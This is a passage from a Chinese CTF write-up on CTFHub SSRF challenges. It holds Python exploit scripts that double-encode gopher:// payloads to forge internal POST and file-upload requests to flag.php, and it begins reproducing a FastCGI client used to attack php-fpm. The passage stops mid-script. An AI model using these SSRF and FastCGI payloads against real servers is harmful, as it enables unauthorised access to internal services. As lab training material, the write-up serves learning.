key=bacd40b119dfa24fa24640331508799f</code></pre>

<p>用python请求，exp如下</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://challenge-27a1758eb0df6f71.sandbox.ctfhub.com:10800/?url="</span>

payload <span class="token operator">=</span>\
<span class="token triple-quoted-string string">"""POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=bacd40b119dfa24fa24640331508799f
"""</span>

<span class="token comment">#注意后面一定要有回车，回车结尾表示http请求结束</span>
tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>new
result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>       <span class="token comment"># 这里因为是GET请求所以要进行两次url编码</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>

<pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A80&#x2F;_POST%2520&#x2F;flag.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dbacd40b119dfa24fa24640331508799f%250D%250A</code></pre>

<p>请求结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707163338679.png" alt loading="lazy"></p>
<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>题目提示<code>这次需要上传一个文件到flag.php了.祝你好运</code></p>
<p>http请求一下flag.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707164424153.png" alt loading="lazy"></p>
<p>file读下源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CTFHUB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

Upload Webshell

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>

<p>写个文件上传的表单</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>NewFile<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>

<p>随便传个文件把包抓下来</p>
<p>数据包为</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">182</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundaryqFOX61XFhjO2CFJN</span></span>

------WebKitFormBoundaryqFOX61XFhjO2CFJN
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename="1.png"</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/png</span></span>

abcd
------WebKitFormBoundaryqFOX61XFhjO2CFJN--</code></pre>

<p>还是和上一个一样，exp如下</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://challenge-db30f38f11747128.sandbox.ctfhub.com:10800/?url="</span>

payload <span class="token operator">=</span>\
<span class="token triple-quoted-string string">"""POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 182
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqFOX61XFhjO2CFJN

------WebKitFormBoundaryqFOX61XFhjO2CFJN
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/png

abcd
------WebKitFormBoundaryqFOX61XFhjO2CFJN--
"""</span>

tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>new
result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>

<pre class="language-none"><code class="language-none">gopher%3A&#x2F;&#x2F;127.0.0.1%3A80&#x2F;_POST%2520&#x2F;flag.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520182%250D%250AContent-Type%253A%2520multipart&#x2F;form-data%253B%2520boundary%253D----WebKitFormBoundaryqFOX61XFhjO2CFJN%250D%250A%250D%250A------WebKitFormBoundaryqFOX61XFhjO2CFJN%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.png%2522%250D%250AContent-Type%253A%2520image&#x2F;png%250D%250A%250D%250Aabcd%250D%250A------WebKitFormBoundaryqFOX61XFhjO2CFJN--%250D%250A</code></pre>

<p>请求结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210707165044259.png" alt loading="lazy"></p>
<h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p>题目提示<code>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</code></p>
<p>直接看P🐮的这个 <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p>利用方法参考 <a href="https://bbs.ichunqiu.com/thread-58455-1-1.html">https://bbs.ichunqiu.com/thread-58455-1-1.html</a></p>
<p>理解原理后直接利用，利用脚本地址 <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<p>我这里放这存一个</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> random
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO

<span class="token comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>

PY2 <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">bchr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> PY2<span class="token punctuation">:</span>
        <span class="token keyword">return</span> force_bytes<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">bord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> c
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">force_bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> s
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">force_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">issubclass</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> s
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token keyword">return</span> s


<span class="token keyword">class</span> <span class="token class-name">FastCGIClient</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""A Fast-CGI Client for Python"""</span>

    <span class="token comment"># private</span>
    __FCGI_VERSION <span class="token operator">=</span> <span class="token number">1</span>

    __FCGI_ROLE_RESPONDER <span class="token operator">=</span> <span class="token number">1</span>
    __FCGI_ROLE_AUTHORIZER <span class="token operator">=</span> <span class="token number">2</span>
    __FCGI_ROLE_FILTER <span class="token operator">=</span> <span class="token number">3</span>

    __FCGI_TYPE_BEGIN <span class="token operator">=</span> <span class="token number">1</span>
    __FCGI_TYPE_ABORT <span class="token operator">=</span> <span class="token number">2</span>
    __FCGI_TYPE_END <span class="token operator">=</span> <span class="token number">3</span>
    __FCGI_TYPE_PARAMS <span class="token operator">=</span> <span class="token number">4</span>
    __FCGI_TYPE_STDIN <span class="token operator">=</span> <span class="token number">5</span>
    __FCGI_TYPE_STDOUT <span class="token operator">=</span> <span class="token number">6</span>
    __FCGI_TYPE_STDERR <span class="token operator">=</span> <span class="token number">7</span>
    __FCGI_TYPE_DATA <span class="token operator">=</span> <span class="token number">8</span>
    __FCGI_TYPE_GETVALUES <span class="token operator">=</span> <span class="token number">9</span>
    __FCGI_TYPE_GETVALUES_RESULT <span class="token operator">=</span> <span class="token number">10</span>
    __FCGI_TYPE_UNKOWNTYPE <span class="token operator">=</span> <span class="token number">11</span>

    __FCGI_HEADER_SIZE <span class="token operator">=</span> <span class="token number">8</span>

    <span class="token comment"># request state</span>
    FCGI_STATE_SEND <span class="token operator">=</span> <span class="token number">1</span>
    FCGI_STATE_ERROR <span class="token operator">=</span> <span class="token number">2</span>
    FCGI_STATE_SUCCESS <span class="token operator">=</span> <span class="token number">3</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> keepalive<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host
        self<span class="token punctuation">.</span>port <span class="token operator">=</span> port
        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout
        <span class="token keyword">if</span> keepalive<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> <span class="token boolean">None</span>
        self<span class="token punctuation">.</span>requests <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__connect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment"># if self.keepalive:</span>
        <span class="token comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>
        <span class="token comment"># else:</span>
        <span class="token comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>sock <span class="token operator">=</span> <span class="token boolean">None</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

    <span class="token keyword">def</span> <span class="token function">__encodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fcgi_type<span class="token punctuation">,</span> content<span class="token punctuation">,</span> requestid<span class="token punctuation">)</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        buf <span class="token operator">=</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_VERSION<span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>fcgi_type<span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>requestid <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>requestid <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>length <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \
               <span class="token operator">+</span> content
        <span class="token keyword">return</span> buf

    <span class="token keyword">def</span> <span class="token function">__encodeNameValueParams</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        nLen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
        vLen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
        record <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">if</span> nLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>
            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>nLen<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>nLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> vLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>
            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>vLen<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \
                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>vLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> record <span class="token operator">+</span> name <span class="token operator">+</span> value

    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIHeader</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
        header <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        header<span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> header

    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        header <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>__FCGI_HEADER_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> header<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            record <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIHeader<span class="token punctuation">(</span>header<span class="token punctuation">)</span>
            record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b''</span>
            
            <span class="token keyword">if</span> <span class="token string">'contentLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                contentLength <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span>contentLength<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">'paddingLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                skiped <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> record

